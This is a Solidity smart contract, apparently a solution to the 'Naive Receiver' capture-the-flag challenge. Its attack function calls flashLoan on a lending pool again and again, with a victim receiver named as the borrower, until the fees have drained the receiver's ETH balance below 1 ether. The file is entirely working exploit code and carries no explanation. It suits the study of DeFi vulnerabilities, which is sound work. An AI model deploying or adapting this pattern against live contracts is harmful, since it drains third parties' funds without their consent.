// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


interface iNaiveReceiverLenderPool {
    function flashLoan(address borrower, uint256 borrowAmount) external;
}

contract AttackNaiveReceiver {
    function attack(address _targetPool, address _targetReceiver) public {
        iNaiveReceiverLenderPool targetPool = iNaiveReceiverLenderPool(_targetPool);

        while(address(_targetReceiver).balance >= 1 ether) {
            targetPool.flashLoan(_targetReceiver, 1 ether);
        }
    }
}